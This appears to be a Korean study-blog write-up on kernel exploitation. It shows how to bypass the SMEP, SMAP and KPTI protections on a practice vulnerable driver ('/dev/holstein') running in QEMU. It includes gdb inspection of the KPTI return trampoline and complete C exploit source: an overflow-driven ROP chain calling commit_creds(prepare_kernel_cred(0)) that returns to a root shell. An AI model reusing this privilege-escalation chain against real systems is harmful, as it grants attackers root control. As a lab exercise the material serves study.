---
title: "[KERNEL] KROP_(KPTI bypass)"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※이번엔 SMEP, SMAP와 함께 KPTI 보호 기법을 우회하는 KROP를 다뤄보겠다. #!/bin/shqemu-system-x86_64 \\ -m 64M \\ -nographic \\ -kernel bzImage \\ -append \"console=ttyS"
date: "2024-06-28"
translation_key: "tistory-1988ea5328ae"
tags: ["STUDY/KERNEL"]
category: "STUDY/KERNEL"
source_url: "https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※****

  
  

이번엔 SMEP, SMAP와 함께 KPTI 보호 기법을 우회하는 KROP를 다뤄보겠다.

```
#!/bin/sh
qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr pti=on" \
    -no-reboot \
    -cpu qemu64,+smep,+smap \
    -smp 1 \
    -monitor /dev/null \
    -initrd debugfs.cpio \
    -net nic,model=virtio \
    -net user \
    -gdb tcp::12345
```

run.sh를 위와 같이 수정해준다.

+smep : smep 활성화

+smap : smap 활성화

\-append "... pti=on ..." : kpti 활성화

![](/assets/images/tistory/tistory-1988ea5328ae/001.png)

이전에 제작했던 KROP 바이너리를 실행했더니 Segment fault가 뜨고 있다.

[https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass](https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass)

 [\[KERNEL\] KROP\_(SMEP bypass)

※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 유저 영역에서 ROP는 NX-BIT 보호 기법을 우회하기 위해서 사용했었다. 커널 영역에서의 ROP 역시 SMEP라는 보호기법을

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass)

이를 우회하기 위해서는 CR3 레지스터를 변조해야한다,

CR3 레지스터 : 커널 영역에서 작업 처리 후 유저 영역으로 다시 넘어올 때 참조하는 레지스터이다.

이는 유저 영역에서의 접근 가능한 메모리 영여과 커널 영역에서의 접근 가능한 메모리 영역을 다르게 하기 위해서 사용된다. 이와 관련된 대표적인 매크로가 존재한다.

```
swapgs_restore_regs_and_return_to_usermode
```

```
	POP_REGS pop_rdi=0

	/*
	 * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.
	 * Save old stack pointer and switch to trampoline stack.
	 */
	movq	%rsp, %rdi
	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp
	UNWIND_HINT_EMPTY

	/* Copy the IRET frame to the trampoline stack. */
	pushq	6*8(%rdi)	/* SS */
	pushq	5*8(%rdi)	/* RSP */
	pushq	4*8(%rdi)	/* EFLAGS */
	pushq	3*8(%rdi)	/* CS */
	pushq	2*8(%rdi)	/* RIP */

	/* Push user RDI on the trampoline stack. */
	pushq	(%rdi)

	/*
	 * We are on the trampoline stack.  All regs except RDI are live.
	 * We can do future final exit work right here.
	 */
	STACKLEAK_ERASE_NOCLOBBER

	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi

	/* Restore RDI. */
	popq	%rdi
	SWAPGS
	INTERRUPT_RETURN
```

이 코드에서 주의해야하는 부분은  \[SWITCH\_TO\_USER\_CR3\_STACK scratch\_reg=%rdi\] 이다.

![](/assets/images/tistory/tistory-1988ea5328ae/002.png)

디버깅을 위해 매크로의 위치를 확인한다.

```
gdb
gef-remote localhost 12345
x/32gi 0xffffffff81800e10
```

![](/assets/images/tistory/tistory-1988ea5328ae/003.png)

![](/assets/images/tistory/tistory-1988ea5328ae/004.png)

![](/assets/images/tistory/tistory-1988ea5328ae/005.png)

CR3레지스터의 조작이 이루어지는 부분이다. CR3 레지스터가 조작되면 iretq 이후 커널에서 스택의 데이터를 가져와 복구하는 것이 불가능해진다. 

![](/assets/images/tistory/tistory-1988ea5328ae/006.png)

코드를 조금 더 살펴보면, CR3 조작 전에 스택 프레임을 쌓는 작업이 있다.

→ 이후 0xffffffff81800e7f에서 pop rax; pop rdi; 수행

→ 0xffffffff81800eb0 에서 swapgs; iretq; 수행

→ rip, cs, rflags, rsp, ss 설정 가능

위의 주소들을 가져와서 exploit 코드를 작성하면 아래와 같다.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long prepare_kernel_cred = 0xffffffff8106e240;
unsigned long commit_creds = 0xffffffff8106e390;
#define prdi  0xffffffff8127bbdc
#define prsi  0xffffffff8101ccde
#define prdx  0xffffffff81146092
#define prcx  0xffffffff812ea083
#define mrdi  0xffffffff8160c96b
#define swapgs  0xffffffff8160bf7e
#define iretq  0xffffffff810202af
#define rtu 0xffffffff81800e26

static void win() {
        char *argv[] = { "/bin/sh", NULL };
        char *evnp[] = { NULL };
        puts("[+] win!");
        execve("/bin/sh", argv, evnp);
}

static void save_state() {
        asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %2\n"
            "pushfq\n"
            "popq %3\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags
)
	  :
      : "memory");
}

int main() {
    save_state();
    int fd = open("/dev/holstein", 2);

    char buf[0x500];
    memset(buf, 'A', 0x408);
    
    //commit_cred(prepare_kernel_cred(NULL)) 구현하기
    unsigned long *payload = (unsigned long*)&buf[0x408];
    *payload++ = prdi;
    *payload++ = 0;
    *payload++ = prepare_kernel_cred;
    *payload++ = prcx;
    *payload++ = 0; //rep 명령어 때문에 추가한 부분 -> rcx를 0으로 두어 반복을 안하기 위함
    *payload++ = mrdi;
    *payload++ = commit_creds;
    *payload++ = rtu;
    *payload++ = 0xdeadbeef;
    *payload++ = 0xdeadbeef;
    *payload++ = (unsigned long*)&win;
    *payload++ = user_cs;
    *payload++ = user_rflags;
    *payload++ = user_rsp;
    *payload++ = user_ss;
    
    write(fd,buf, (void*)payload - (void*)buf);

    close(fd);
    return 0;
}
```

```
gcc kpti.c -o kpti --static
cp kpti ./root/
cd root
find . -print0 | cpio -o --null --format=newc --owner=root > ../debugfs.cpio
cd ..
sh run.sh
```

![](/assets/images/tistory/tistory-1988ea5328ae/007.png)

이번에는 정상적으로 권한 상승에 성공한 것을 볼 수 있다.
